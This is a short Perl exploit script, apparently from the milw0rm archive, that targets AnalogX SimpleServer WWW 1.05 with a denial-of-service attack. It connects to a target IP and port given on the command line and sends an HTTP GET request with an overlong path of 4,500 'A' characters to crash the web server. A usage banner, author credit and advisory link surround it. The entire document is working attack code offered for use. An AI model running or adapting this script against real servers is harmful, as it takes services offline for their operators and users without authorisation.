#!/usr/bin/perl

use IO::Socket;

if (@ARGV <2)
 {
  print "\n ::: ---------------------------------------------- :::\n";
  print " ::: AnalogX SimpleServer WWW 1.05 Dos Exploit     :::\n";
  print " :::                                                :::\n";
  print " ::: Advisory : http://www.ussrback.com/labs45.html :::\n";
  print " ::: By       : Qnix  - Qnix[at]bsdmail[dot]org     :::\n";
  print " :::                                                :::\n";
  print " ::: Usage:  analogx_dos.pl [ip] [port]             :::\n";
  print " ::: ---------------------------------------------- :::\n";
  exit();
 }

$buf="A"x4500;
print "\n <+> Prepare to start connect.\n";
sleep(1);
$s = IO::Socket::INET->new(Proto=>"tcp",
                           PeerAddr=>$ARGV[0],
                           PeerPort=>$ARGV[1],
                           Timeout=>6
                           ) or die " <-> Target web server already DoSeD ??? or can't connect :(\n\n";
 $s->autoflush();

print " <+> Connected to $ARGV[0]:$ARGV[1]\n";
sleep(1);
print " <+> Sending the devil shit.\n";
sleep(1);
print $s "GET /$buf HTTP/1.1\n";

print " <+> Prepare to DoS with AAAAAA's .\n";
sleep(1);
close($s);

print " <+> Ok now target web server maybe DoSeD.\n\n";

# milw0rm.com [2005-07-07]
